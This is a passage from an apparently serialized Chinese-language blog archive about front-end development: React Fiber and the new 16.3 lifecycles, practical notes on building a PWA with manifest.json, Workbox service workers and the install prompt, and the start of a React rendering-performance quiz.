住了，因為每個小工作之間都可以有空檔去做別的事情（響應使用者的點擊、繪製新的畫面等等）。 就像下面這張示意圖一樣，每次完成一點點的工作，而不是一次完成全部的： （圖片來源：Lin Clark - A Cartoon Intro to Fiber - React Conf 2017 ） 好了，你已經知道什麼是 Fiber 了，這就是 Fiber。每一個小工作就叫做 Fiber，而 Fiber 在英文裡面是纖維的意思，所以又有人把這個機制稱作「纖程」。 或是換個角度想，原本的問題是因為程式裡面這樣子一層層執行 render function 的方法是透過 call stack，每次 call 一個 function 就把一個新的任務丟到 stack frame 去，可是這樣子的機制會導致任務無法中斷。 於是 Fiber 就實作出了 virtual stack frame，簡單來說就是自己用 js 再模擬出一個 call stack 的感覺，但好處就是自己有完全的掌控權，而不是被 js 的運行機制給綁住。 再幫大家重新整理一次，沒有 Fiber 之前，你要更新的時候都是「一次性」的更新，中間無法中斷，導致 main thread 在這期間會被 block 住。 有了 Fiber 這個機制之後，我們把一個大更新切成很多塊小的更新，每次只更新一點點，這樣子在更新的空檔 main thread 就能去做其他事情，而不會被綁住。 聽起來十分美好，問題迎刃而解，可是副作用是什麼呢？ Fiber 所帶來的改變 把核心換成 Fiber 之後，是要付出一些代價的。在 Fiber 裡面的工作其實分成兩個階段： render/reconciliation commit 簡單來說呢，第一階段就是找出需要改變的部分，而第二階段是真正的把這些改變應用到 DOM 上面去。第一階段是可以被中斷，也可以被重新執行的，而第二階段跟以前一樣，必須一口氣做完。 而這兩個階段也對應到不同的生命週期： 第一階段 componentWillMount componentWillReceiveProps shouldComponentUpdate componentWillUpdate 第二階段 componentDidMount componentDidUpdate componentWillUnmount 因為第一階段是可以中斷並且之後再重新執行的，所以會導致在第一階段裡的這些函數，有可能被 call 很多次。 （圖片來源：Lin Clark - A Cartoon Intro to Fiber - React Conf 2017 ） 所以，假設你之前習慣在componentWillMount裡面就呼叫 API 拿資料的話，就會導致你 call 了不只一次的 API，會浪費一些頻寬，要改變的話就要把這些 code 移到componentDidMount去，就只會保證被 call 一次而已。 總之呢，自從內部機制改成 Fiber 之後（從 React 16 開始，所以如果你是用 16 以上的版本，已經是 Fiber 了），React 的生命週期函數被呼叫的次數跟方式會跟以前不太一樣。 除此之外就是我開頭提的那個順序的不一樣，這點也是值得注意的一個部分。雖然看起來不是什麼大問題，但如果不知道這點的話可能會生出一些莫名其妙的 Bug。 React 的未來 React 16.3 在昨天正式發佈了，伴隨而來的是正式的 context API 以及 lifecycle 的改變。 隨著 Fiber 的正式上線，未來可以期待會有更多令人興奮的新功能。比如說在Sneak Peek: Beyond React 16這篇提到的time slicing，把整個 App 的體驗變得更順暢。 而Update on Async Rendering這篇文章也提到了非同步渲染的進展。 自從內部的機制改成 Fiber 之後，就讓 async rendering 得以發揮最大的效能。 但為了 async rendering，是需要付出一些代價的。原本的 lifecycle API 在這種場景底下可能會有一些問題，官方有給出許多常見的例子，也包含我們上面所說到的，componentWillMount會被呼叫多次的問題： （忽略原本的範例程式碼，但大意就是在componentWillMount裡面 call API） The above code is problematic for both server rendering (where the external data won’t be used) and the upcoming async rendering mode (where the request might be initiated multiple times). The recommended upgrade path for most use cases is to move data-fetching into componentDidMount 對於 async rendering，會引起問題的是以下三個生命週期： componentWillMount componentWillReceiveProps componentWillUpdate 這三個 lifecycle 會在 React 17 裡面被拿掉（如果你還是想用的話可以加上UNSAFE_，例如說改成UNSAFE_componentWillMount就一樣可以用），但既然都說是 UNSAFE 了，沒有理由繼續使用下去。 舊的不去新的不來，在最新發佈的 16.3 中，引入了兩個新的 lifecycle 來解決上面的那些問題： getDerivedStateFromProps getSnapshotBeforeUpdate 第一個很顯然是要來取代componentWillReceiveProps的，而第二個是拿來取代componentWillUpdate的。或其實有些場景底下，用componentDidUpdate也可以取代原本那兩個生命週期。 至於最前面所提到的componentWillMount，則建議把裡面的程式碼搬到componentDidMount去。 接著讓我們快速來看一下新的生命週期如何替代舊的，以下我就直接使用官方給的範例了。這個範例會偵測 props 來決定要不要改變 state，是很常見的應用場景： 123456789101112131415// Beforeclass ExampleComponent extends React.Component &#123; state = &#123; isScrollingDown: false, &#125;; componentWillReceiveProps(nextProps) &#123; if (this.props.currentRow !== nextProps.currentRow) &#123; this.setState(&#123; isScrollingDown: nextProps.currentRow &gt; this.props.currentRow, &#125;); &#125; &#125;&#125; 而新的生命週期static getDerivedStateFromProps，會在 component 被建立還有收到新的 props 的時候被呼叫，但只會傳入新的 props 跟舊的 state，因此我們可以這樣改： 12345678910111213141516171819202122// Afterclass ExampleComponent extends React.Component &#123; // 初始化 state state = &#123; isScrollingDown: false, lastRow: null, &#125;; static getDerivedStateFromProps(nextProps, prevState) &#123; // 把新的 props 跟舊的 state 做比較 if (nextProps.currentRow !== prevState.lastRow) &#123; // 回傳新的 state return &#123; isScrollingDown: nextProps.currentRow &gt; prevState.lastRow, lastRow: nextProps.currentRow, // 同步一下 state &#125;; &#125; // return null 代表不用改變 state return null; &#125;&#125; 其實說穿了就只是你自己把以前componentWillReceiveProps會傳來的prevProps存到 state 裡面，改成跟 state 來比較而已。 看到這邊你可能會很疑惑：「那為什麼 getDerivedStateFromProps 不直接把 prevProps 傳進來就好？」 React 官方給的理由有兩個： 因為 getDerivedStateFromProps 在初始化的時候也會被 call，所以第一次的 prevProps 會是 null，代表你每次都要做一次 null check，這樣不好 不傳 prevProps 就代表 React 不用幫你記住 prevProps 了，對未來在記憶體上面的優化有幫助 總之呢，以後就不會有componentWillReceiveProps可以用了，你要自己把需要的prevProps保存在 state 裡面，並且在getDerivedStateFromProps裡面進行比較。 再看另外一個例子，這個例子的目的是要在新增 item 的時候維持捲軸的位置，所以必須在 update 之前保存舊的高度，在 update 之後去調整捲軸的位置： 1234567891011121314151617181920212223242526272829303132class ScrollingList extends React.Component &#123; listRef = null; previousScrollHeight = null; componentWillUpdate(nextProps, nextState) &#123; // 有新增 item 的話，記住現在的高度 if (this.props.list.length &lt; nextProps.list.length) &#123; this.previousScrollHeight = this.listRef.scrollHeight; &#125; &#125; componentDidUpdate(prevProps, prevState) &#123; // 如果 previousScrollHeight 不是 null，代表有新增 item // 調整捲軸位置 if (this.previousScrollHeight !== null) &#123; this.listRef.scrollTop += this.listRef.scrollHeight - this.previousScrollHeight; this.previousScrollHeight = null; &#125; &#125; render() &#123; return ( &lt;div ref=&#123;this.setListRef&#125;&gt; &#123;/* ...contents... */&#125; &lt;/div&gt; ); &#125; setListRef = ref =&gt; &#123; this.listRef = ref; &#125;;&#125; 那這樣子會帶來的問題是什麼呢？還記得我們前面有提過 Fiber 有兩個階段嗎？render 跟 commit。這兩個階段會有時間差，而componentWillUpdate是處於第一個階段，componentDidUpdate是屬於第二個階段。 假如使用者在這兩個階段之間做了一些事情，例如說調整視窗的尺寸，那你存的高度就不會是正確的了，而是會拿到舊的值。 解決方法就是利用新的生命週期getSnapshotBeforeUpdate，這個會在 DOM 被更新之前呼叫，可以保證你拿到的東西一定是最新的。 123456789101112131415161718192021222324252627282930313233class ScrollingList extends React.Component &#123; listRef = null; getSnapshotBeforeUpdate(prevProps, prevState) &#123; // 如果 list 有變動，就回傳現在的捲軸高度 // 這個回傳值會被當作 componentDidUpdate 的第三個參數 if (prevProps.list.length &lt; this.props.list.length) &#123; return this.listRef.scrollHeight; &#125; return null; &#125; componentDidUpdate(prevProps, prevState, snapshot) &#123; // snapshot 就是上面回傳的那個值 // 如果不是 null，就利用 snapshot 來調整捲軸高度 if (snapshot !== null) &#123; this.listRef.scrollTop += this.listRef.scrollHeight - snapshot; &#125; &#125; render() &#123; return ( &lt;div ref=&#123;this.setListRef&#125;&gt; &#123;/* ...contents... */&#125; &lt;/div&gt; ); &#125; setListRef = ref =&gt; &#123; this.listRef = ref; &#125;;&#125; 總之呢，結合搭配使用 commit phase 的 lifecycle（componentDidMount、componentDidUpdate、componentWillUnmount）以及新引進的getDerivedStateFromProps與getSnapshotBeforeUpdate，就可以取代掉舊的那些有可能會造成問題的 lifecycle。 如果想要看更多範例的話，這篇很值得參考：Update on Async Rendering。 結論 效能一直是 Web App 很注重的一個點，而需要把握的原則就只有一個：不要 block main thread。只要 main thread 可以做事，它就可以去處理其他事情，例如說響應使用者的 click 或是繪製新的畫面等等。 而 React 原本的機制會造成問題，因此將內部核心用 Fiber 改寫，把一大個不可中斷的任務切割成許多小的、可以中斷的工作，而可以切割之後也使得以後有平行化的可能，render 的速度可能又會更快一點。 但也因為這樣機制的改變，影響到原本的生命週期，一個不小心就會出狀況，而官方也發布了新的兩個生命週期來解決這個問題。 身為 React 長期的使用者，對這種大的改變雖然覺得要改 code 很煩，但長期來看其實是利多，畢竟可以做的事情又更多了，效能也會愈來愈好。 這篇總結了近期我研究 Fiber 跟關注 React 新的變化的一些心得，Fiber 底層的實作機制因為我也不是很理解，所以不敢出來班門弄斧，只希望能透過白話文讓大家理解這個機制大概是長怎樣。 如果有哪邊有講錯，還麻煩不吝指正，感謝。 參考資料： React Fiber Architecture What is React Fiber ? React中state render到html dom的流程分析 完全理解React Fiber [翻譯] React Fiber 現狀確認 React v16.3.0: New lifecycles and context API React Docs - Scheduling 浅谈React 16中的Fiber机制 Lin Clark - A Cartoon Intro to Fiber - React Conf 2017","link":"/2018/03/31/react-fiber-and-lifecycles/"},{"title":"PWA 實戰經驗分享","text":"前言 前些日子在忙公司的產品改版，從原本的 PHP 換成後端 Go + 前端 React SPA，分成桌面版跟手機版兩個不同的 Project，而既然都改版了，自然要把最新最潮的 PWA 也放在目標裡面，之前耳聞 PWA 很久但卻沒有實作過的我也有了機會來嘗試這個東西。 如今產品已經改版完畢且上線了兩三個月，慢慢穩定下來，在優化 PWA 的過程中也讓我有了一些心得可以讓大家分享。 在舉一些實際案例之前，先讓我們來談談到底怎樣才算是 PWA。 PWA 到底是什麼？ 從 Google 官方的文件：你的首個 Progressive Web App 中可以看出 PWA 的一些詳細定義，但我不太喜歡這種制式的規則，對我來說，PWA 就是一個很像 Native App 的 Web App，而其中瀏覽器的支援也佔了很大的一部分。 在以往儘管你的網站做得再怎麼像 Native App，你還是有兩個難關沒辦法克服：離線的時候就 GG 以及沒辦法安裝在手機上，所以不管怎麼看，人家都知道你就是個 Web App，永遠都不會長得像 Native。 可是自從瀏覽器開始支援 Service Worker 以及 manifest 之後，上面這兩點就被克服了！得益於 Service Worker，讓網頁離線的時候也能夠運作，可以自己寫 code 來決定要渲染什麼畫面；而瀏覽器的「新增到主畫面」的功能更是讓安裝 Web App 成為可能，開發者也可以用 manifest.json 來自訂一些內容，像是啟動畫面以及安裝在主畫面上的名稱等等。 對我來說，如果你能夠利用上面這兩項技術，讓你的 Web App 成功安裝在手機上並且看起來跟 Native App 沒兩樣，我覺得就能稱作是 PWA。 我在之前的文章（原來 CORS 沒有我想像中的簡單）已經有分享過 PWA 在手機上面的樣子了，這邊就不再贅述。還記得我第一次體驗安裝 PWA 的時候也被嚇到了，因為看起來就跟 Native App 沒兩樣，如果真的做得好，應該是很難區分出來的。明明是個網頁可是看起來卻跟 Native App 一樣，這就是 PWA。 接著來介紹幾個 PWA 的重要因素，你要做 PWA 就一定要有下面幾個東西。 manifest.json 首先先來談manifest.json，有寫過 Android 的都知道有個東西叫做AndroidManifest.xml，其實兩個本質上是一樣的東西，就是去描述這個 App 的一些特性。 我們先來看看 Google 官方文件：The Web App Manifest裡面給的範例： 123456789101112131415161718192021&#123; \"short_name\": \"Maps\", \"name\": \"Google Maps\", \"icons\": [ &#123; \"src\": \"/images/icons-192.png\", \"type\": \"image/png\", \"sizes\": \"192x192\" &#125;, &#123; \"src\": \"/images/icons-512.png\", \"type\": \"image/png\", \"sizes\": \"512x512\" &#125; ], \"start_url\": \"/maps/?source=pwa\", \"background_color\": \"#3367D6\", \"display\": \"standalone\", \"scope\": \"/maps/\", \"theme_color\": \"#3367D6\"&#125; 裡面給的資訊很簡單，然後會跟你把 PWA 新增到主畫面時出現的東西息息相關。name的話就是你 App 的名稱，他在主畫面上面就會顯示這個name，但如果你也有提供short_name的話會優先使用short_name。 再來icons就是主畫面上面會出現的 logo 囉，這沒什麼好多談的。start_url則是你從主畫面上開啟時會連線到的地方，很多人會加個?source=pwa之類的，這樣就可以知道這個使用者是使用 PWA，方便做一些統計。 這邊有個小地方要注意，那就是在某一版的 iOS Safari（抱歉我忘記是哪一版，但總之最新的已經沒有這個問題了），它是不會遵守start_url的！他會根據的是你在安裝 PWA 時的網址，例如說你在https://example.com/test/123的時候按下「新增到主畫面」，你在主畫面開啟 PWA 時就會連線到這個畫面。 這部分其實滿困擾的，但幸好最新的 iOS Safari 已經沒有這個問題了，大家可以不用擔心。 還有一個要特別提的就是name、background_color跟icon會自動組成Splash screens，就是你在打開 PWA 的時候會看到的一個畫面，是由這三個資訊自動被 Chrome 所組成的，意思就是你沒辦法客製化這個啟動畫面。 它就是會顯示你指定的背景顏色、然後中間放一個 icon 下面放你 App 的名稱，沒有其他東西可以調了，至少現在是這樣。 在這點上面 iOS 就不一樣，iOS 是不支援這種啟動畫面的，但好處就是你可以自己透過 html 的 tag 來設定！ 12345&lt;link rel='apple-touch-startup-image' href='/assets/splash/splash-1125x2436.png' media='(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)'/&gt; 會有一些尺寸相關的設定你因為要幫每一種不同的 device 都準備一張圖片，詳情可參考：Progressive Web App Splash Screens 或是 Few Tips That Will Make Your PWA on iOS Feel Like Native。 iOS 跟 Android 的差別在於 iOS 的啟動畫面你可以放一張圖片，因此可以完全客製化，你想放什麼就放什麼，自由度比 Android 來得高。 還有就是 icon 的部分，iOS 也不會看你mainfest.json的設定，而是會看自己的 html tag，所以你必須額外設置給 iOS 使用的 icon： 12345&lt;link rel='apple-touch-icon' sizes='192x192' href='/assets/favicons/iOS192x192.png'/&gt; 對於manifest.json，該注意的點差不多就這些。其實最大的問題還是支援度，所以 Google 出了一個PWACompat，可以自動幫你針對舊的瀏覽器調整你的檔案以及 html 的 tag，不過也有人寫了一篇：You shouldn’t use Chrome’s PWACompat library in your Progressive Web Apps 來告訴大家不要用，論點大概是不能這樣一概論之，你必須針對每種不同的平台跟瀏覽器去了解他的差異再來做適配，才能得到最好的使用者體驗，這種統一調整的做法會在很多地方看起來 ok 但是怪怪的。 既然上面都提到 iOS 了，就來講講 iOS 的一些不同之處。其實 iOS 開始提供 PWA 的支援是今年（2018 年）的事情而已，而且剛推出的時候支援度滿差的，不過有在慢慢改善就是了。 關於那些 iOS 不同的地方，這兩篇文章都講得很清楚了：PWAs are coming to iOS 11.3: Cupertino, we have a problem、Progressive Web Apps on iOS are here 🚀。 最大的差異之一大概就是很多時候都不看manifest.json，你要自己額外設置一些相對應的 html tag 才有用，這點是要特別注意的。 再來就是&lt;meta name=”apple-mobile-web-app-capable” content=”yes”&gt;這個 tag 也很重要，主要是告訴瀏覽器説：「我準備好提供全螢幕的體驗了，就算隱藏瀏覽器的 UI 也沒關係」，而這篇：Don’t use iOS meta tags irresponsibly in your Progressive Web Apps 則告訴你千萬不要濫用這個 tag，不然你的 Web App 在 Safari 上的體驗會變得很差，因為很多東西都不支援。 至於 Safari 最大的一點問題我直接引用上面 PWAs are coming to iOS 11.3: Cupertino, we have a problem 的其中一段： Also, it’s a massive problem for apps with two-factor authentication, such as Twitter. If you need to go to another app to get a token or to open a text message or an email, you will get out of the PWA. When you go back to paste the code, you are out of context and, you need to start the login process again losing the validity of that code. It happened to me on Twitter! Which means, the Twitter PWA on iOS is completely unusable for me. 這是什麼意思呢？我直接舉一個實際範例，假如你的 PWA 有提供 Facebook 登入的功能而且是用重新導向的方式，你一點下去他就會開一個新的 Safari 視窗連到 Facebook 讓你授權，可是當你授權完之後回到 PWA，你會發現什麼事情都沒發生。 這一點真的超傷，而且現在應該都還沒修好，只能期待 Safari 之後會把問題修掉了。而 Android Chrome 則是會在同一個視窗底下打開 Facebook，因此結束之後能夠順利完成登入流程。 有關於 iOS 的問題跟manifest.json的注意事項差不多就到這邊，再來我們談談 PWA 的第二個重點：Service Worker。 Service Worker 加入 Service Worker 的目的就只有一個，那就是快取。透過 Service Worker（以下簡稱 SW），可以幫助我們在發送 request 之前就先攔截到並且做處理，而離線運行的原理也是這樣的，我們先在第一次開啟時註冊 SW，並且利用 SW 下載靜態檔案並快取住，之後若使用者離線，我們再用已經快取住的檔案來回覆，就不會發送真的 request，自然也不會發生無法連線的情況。 而 Google 有提供了一個方便的工具：Workbox 來幫助我們自動產生出 SW 以及利用更方便的語法來攔截 request。 舉例來說，我自己用的是 Webpack 的 plugin： 12345678910new workboxPlugin.InjectManifest(&#123; swSrc: path.join(__dirname, '..', SRC_DIR, 'sw.js'), swDest: path.join(__dirname, '..', DIST_DIR, 'sw.js'), globDirectory: path.join(__dirname, '..', DIST_DIR), globPatterns: ['**/*.&#123;js,css&#125;']&#125;), //sw.jslet precacheList = self.__precacheManifest || []workbox.precaching.precacheAndRoute(precacheList) 只要這樣一寫，就會自動去找符合規則的檔案並且加入快取清單裡面，你只要一註冊 SW 的時候就會把那些檔案給快取起來。 除此之外呢，Workbox 也可以針對 URL 來監聽： 1234567891011121314151617181920// sw.jsworkbox.routing.registerRoute(/(https?:\\/\\/)(.*)\\/api\\/(.*)/, args =&gt; workbox.strategies .networkFirst(&#123; cacheName: 'data-cache', plugins: [ new workbox.expiration.Plugin(&#123; maxEntries: 100, maxAgeSeconds: 2592000 &#125;) ] &#125;) .handle(args) .then(response =&gt; &#123; return response &#125;) .catch(err =&gt; &#123; console.log('err:', err) &#125;)) 像上面的程式碼就是針對路徑中含有api的 request 做快取，這樣在離線時也可以利用以前快取住的 API response。 Workbox 針對這種動態的快取提供幾種策略，分別是：staleWhileRevalidate、cacheFirst、networkFirst、networkOnly與cacheOnly，其實看名字就可以大概理解策略是什麼了，想知道詳細的內容可以參考官方文件：Workbox Strategies。 總之自從有了 Workbox 之後，基本上就不用自己手寫 SW 了，都靠著它提供的 API 以及功能就行了，就可以自動產生出符合需求的 SW。 Add to home screen banner 最後要來談的是「安裝 PWA」這一塊，在 iOS Safari 上面別無他法，就只能自己叫出選單然後選取「Add to home screen」，可是在 Android Chrome 上面，如果你符合一定的條件（有設置mainfest.json以及有註冊 Service Worker），就會自動幫你跳出一個可愛的 Install banner。 （圖片來自：Changes to Add to Home Screen Behavior） 根據 Chrome 版本的不同，行為也有所不同。 在 Chrome 67（含）以前的版本，如果你在beforeinstallprompt事件裡面沒有特別用preventDefault()，或是顯式的呼叫了prompt()，就會出現最左邊那個頗大的 A2HS banner。 然後在 Chrome 68（含）之後的版本，無論你做了什麼，系統都會自動出現那個 Mini-infobar，但如果使用者關掉的話，要隔三個月才會再出現一次，實在是有夠久。 接著呢，上面這兩個 A2HS banner 跟 Mini-infobar，使用者點擊之後都會出現最右邊的 A2HS Dialog，提示使用者要不要安裝 PWA。 但是在 Chrome 68 以後，你也可以利用程式去呼叫beforeinstallprompt裡面拿到的event.prompt()把這個 dialog 顯示出來。 聽起來有點複雜對吧？ 先來介紹beforeinstallprompt這個 event 好了，這個 event 在一切都準備就緒，確認你滿足條件可以顯示 prompt 的時候會被觸發，會傳來一個 event，你可以阻止顯示 prompt，把這個 event 存起來： 1234567891011// 此範例來自上面的官方文件let installPromptEvent; window.addEventListener('beforeinstallprompt', (event) =&gt; &#123; // Prevent Chrome &lt;= 67 from automatically showing the prompt event.preventDefault(); // Stash the event so it can be triggered later. installPromptEvent = event; // Update the install UI to notify the user app can be installed document.querySelector('#install-button').disabled = false;&#125;); 為什麼要存起來呢？因為使用者可能不想一打開網站就看到這個彈窗，或者他可能正在結帳結果你跳這個東西來干擾他，所以先把它存起來，等適當的時機再呼叫installPromptEvent.prompt()來跳出 Dialog。 但要注意的事情是你直接呼叫installPromptEvent.prompt()是沒用的，你必須要within a user gesture，意思就是你要放在按鈕的 click 事件（或其他由使用者觸發的事件）裡才有效，直接呼叫是沒有用的，而且會看到 console 跳出錯誤訊息。 我之前一度很好奇它是怎麼做判斷的，後來發現原來有event.isTrusted可以用，可以判斷一個事件是不是被使用者主動觸發的，參考資料：MDN - Event.isTrusted。 總之呢，因為在不同版本上的 Chrome 有不同行為，所以最後我們決定用下面的程式碼針對不同版本有不同的反應： 1234567891011121314151617181920212223242526272829303132333435// 把 event 存起來var installPromptEvent // 要顯示 prompt 的延遲var showTime = 30 * 1000 window.addEventListener('beforeinstallprompt', function (e) &#123; e.preventDefault() installPromptEvent = e var data = navigator.userAgent.match(/Chrom(e|ium)\\\\/([0-9]+)\\\\./) var version = (data &amp;&amp; data.length &gt;= 2) ? parseInt(data[2], 10) : null if (version &amp;&amp; installPromptEvent.prompt) &#123; // 延遲一段時間才顯示 prompt setTimeout(function() &#123; // 如果 Chrome 版本是 67（含）以下，可以直接呼叫 if (version &lt;= 67) &#123; installPromptEvent.prompt() return &#125; // 否則的話必須透過 user action 主動觸發 // 這邊幫 #root 加上 event listener，代表點擊螢幕任何一處都會顯示 prompt document.querySelector('#root').addEventListener('click', addToHomeScreen) &#125;, showTime) &#125;&#125;); function addToHomeScreen(e) &#123; if (installPromptEvent) &#123; installPromptEvent.prompt() installPromptEvent = null document.querySelector('#root').removeEventListener('click', addToHomeScreen) &#125;&#125; 如果是 67 以下，直接呼叫就可以顯示 prompt，否則的話還要再一步，要加個 event listener 才行，而我們也選擇延遲 30 秒才顯示。 出乎意料地，這樣一個小改動帶來驚人的成長，原本一天大概才 20、30 個人安裝 PWA，經過這樣調整之後瞬間變成八到十倍，看到 GA 的那個統計圖我也嚇了一跳，沒想到效果這麼好。 與其一直積極地要別人快點安裝 PWA，還不如只要求真的對你產品有興趣（停留超過 30 秒鐘）的人。 manifest 觀摩 最後我們來看看幾個知名的 PWA 都是怎麼寫他們的manifest.json。 第一個是 PWA 界中很有名的 flipkart： 123456789101112131415161718192021&#123; \"name\": \"Flipkart Lite\", \"short_name\": \"Flipkart Lite\", \"icons\": [ &#123; \"src\": \"https://img1a.flixcart.com/www/linchpin/batman-returns/logo_lite-cbb3574d.png\", \"sizes\": \"192x192\", \"type\": \"image/png\" &#125; ], \"gcm_sender_id\": \"656085505957\", \"gcm_user_visible_only\": true, \"start_url\": \"/?start_url=homescreenicon\", \"permissions\": [ \"gcm\" ], \"orientation\": \"portrait\", \"display\": \"standalone\", \"theme_color\": \"#2874f0\", \"background_color\": \"#2874f0\"&#125; 再來是鼎鼎大名的 twitter： 1234567891011121314151617181920212223242526272829303132&#123; \"background_color\": \"#ffffff\", \"description\": \"It's what's happening. From breaking news and entertainment, sports and politics, to big events and everyday interests.\", \"display\": \"standalone\", \"gcm_sender_id\": \"49625052041\", \"gcm_user_visible_only\": true, \"icons\": [ &#123; \"src\": \"https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\", \"sizes\": \"192x192\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\", \"sizes\": \"512x512\", \"type\": \"image/png\" &#125; ], \"name\": \"Twitter\", \"share_target\": &#123; \"action\": \"compose/tweet\", \"params\": &#123; \"title\": \"title\", \"text\": \"text\", \"url\": \"url\" &#125; &#125;, \"short_name\": \"Twitter\", \"start_url\": \"/\", \"theme_color\": \"#ffffff\", \"scope\": \"/\"&#125; 最後則是 Google I/O 2018： 123456789101112131415161718192021222324252627282930313233343536373839&#123; \"name\": \"Google I/O 2018\", \"short_name\": \"I/O 2018\", \"start_url\": \"./?utm_source=web_app_manifest\", \"display\": \"standalone\", \"theme_color\": \"#6284F3\", \"background_color\": \"#6284F3\", \"icons\": [&#123; \"src\": \"static/images/homescreen/homescreen57.png\", \"sizes\": \"57x57\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen114.png\", \"sizes\": \"114x114\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen128.png\", \"sizes\": \"128x128\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen144.png\", \"sizes\": \"144x144\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen192.png\", \"sizes\": \"192x192\", \"type\": \"image/png\" &#125;, &#123; \"src\": \"static/images/homescreen/homescreen512.png\", \"sizes\": \"512x512\", \"type\": \"image/png\" &#125;], \"prefer_related_applications\": false, \"related_applications\": [&#123; \"platform\": \"play\", \"id\": \"com.google.samples.apps.iosched\" &#125;], \"gcm_sender_id\": \"103953800507\"&#125; 我滿喜歡觀察別人家的這些東西，因為你會發現很多你查資料時遺漏或是根本找不到的資訊，而且這些看久了你也會有個概念，知道哪些屬性特別常用，除了manifest.json以外，也可以參考 html 裡面的 tag，一樣能學習到很多。 結論 前陣子在與 PWA 奮戰以及被 PM 的夾擊之下，搜集了很多跟 PWA 有關的資料，也參考了許多很有用的文章，真心感謝那些前輩們的分享，才能避免後人踩一大堆坑。 雖然在 iOS 上的體驗差了點，但整體來說我還是很看好 PWA 的發展，第一個是 Google 強力推動，第二個是瀏覽器的支援度愈來愈高，就像我上面說的，iOS Safari 已經有慢慢把 Bug 給修掉了，之後的功能會比較完整一些。 再者，PWA 的使用者體驗是很不錯的，有可以接受的速度以及 Web 的彈性，重點是不用去 Google Play 特地下載就少了一道轉換的門檻（雖然還是有安裝 PWA 的門檻就是了，但我覺得比較容易一些），而 Chrome 也提供了許多機制給 PWA，希望使用者能安裝 PWA 在手機上。 總之呢，這篇主要是跟大家分享我在做 PWA 時候的一些小小心得，如果你也有什麼心得歡迎在底下留言跟我分享，感謝。 延伸閱讀與參考資料： Changes to Add to Home Screen Behavior Progressive Web App Splash Screens Few Tips That Will Make Your PWA on iOS Feel Like Native PWAs are coming to iOS 11.3: Cupertino, we have a problem Progressive Web App 會是未來趨勢嗎？ PWA case studies A Pinterest Progressive Web App Performance Case Study","link":"/2018/10/13/pwa-in-action/"},{"title":"React 性能優化大挑戰：一次理解 Immutable data 跟 shouldComponentUpdate","text":"前陣子正在重構公司的專案，試了一些東西之後發現自己對於 React 的渲染機制其實不太了解，不太知道 render 什麼時候會被觸發。而後來我發現不只我這樣，其實還有滿多人對這整個機制不太熟悉，因此決定寫這篇來分享自己的心得。 其實不知道怎麼優化倒還好，更慘的事情是你自以為在優化，其實卻在拖慢效能，而根本的原因就是對 React 的整個機制還不夠熟。被「優化」過的 component 反而還變慢了！這個就嚴重了。 因此，這篇文章會涵蓋到下面幾個主題： Component 跟 PureComponent 的差異 shouldComponentUpdate 的作用 React 的渲染機制 為什麼要用 Immutable data structures 為了判別你到底對以上這些理解多少，我們馬上進行幾個小測驗！有些有陷阱，請睜大眼睛看清楚啦！ React 小測驗 第一題 以下程式碼是個很簡單的網頁，就一個按鈕跟一個叫做Content的元件而已，而按鈕按下去之後會改變App這個 component 的 state。 12345678910111213141516171819202122232425262728class Content extends React.Component &#123; render () &#123; console.log('render content!'); return &lt;div&gt;Content&lt;/div&gt; &#125;&#125; class App extends React.Component &#123; handleClick = () =&gt; &#123; this.setState(&#123; a: 1 &#125;) &#125; render() &#123; console.log('render App!'); return ( &lt;div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt; &lt;Content /&gt; &lt;/div&gt; ); &#125;&#125; ReactDOM.render( &lt;App /&gt;, document.getElementById('container')); 請問：當你按下按鈕之後，console 會輸出什麼？ A. 什麼都沒有（App 跟 Content 的 render function 都沒被執行到） B. 只有 render App!（只有 App 的 render function 被執行到） C. render App! 以及 render content!（兩者的 render function 都被執行到） 第二題 以下程式碼也很簡單，分成三個元件：App、Table 跟 Row，由 App 傳遞 list 給 Table，Table 再用 map 把每一個 Row 都渲染出來。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Row extends Component &#123; render () &#123; const &#123;item, style&#125; = this.props; return ( &lt;tr style=&#123;style&#125;&gt; &lt;td&gt;&#123;item.id&#125;&lt;/td&gt; &lt;/tr&gt; ) &#125;&#125; class Table extends Component &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table&gt; &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125; &lt;/table&gt; ) &#125;&#125; class App extends Component &#123; state = &#123; list: Array(10000).fill(0).map((val, index) =&gt; (&#123;id: index&#125;)) &#125; handleClick = () =&gt; &#123; this.setState(&#123; otherState: 1 &#125;) &#125; render() &#123; const &#123;list&#125; = this.state; return ( &lt;div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;change state!&lt;/button&gt; &lt;Table list=&#123;list&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 而這段程式碼的問題就在於按下按鈕之後，App的 render function 被觸發，然後Table的 render function 也被觸發，所以重新渲染了一次整個列表。 可是呢，我們點擊按鈕之後，list根本沒變，其實是不需要重新渲染的，所以聰明的小明把 Table 從 Component 變成 PureComponent，只要 state 跟 props 沒變就不會重新渲染，變成下面這樣： 123456789101112131415161718class Table extends PureComponent &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table&gt; &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125; &lt;/table&gt; ) &#125;&#125; // 不知道什麼是 PureComponent 的朋友，可以想成他自己幫你加了下面的 functionshouldComponentUpdate (nextProps, nextState) &#123; return !shallowEqual(this.props, nextProps) || !shallowEqual(this.state, nextState)&#125; 把 Table 從 Component 換成 PureComponent 之後，如果我們再做一次同樣的操作，也就是按下change state按鈕改變 App 的 state，這時候會提升效率嗎？ A. 會，在這情況下 PureComponent 會比 Component 有效率 B. 不會，兩者差不多 C. 不會，在這情況下 Component 會比 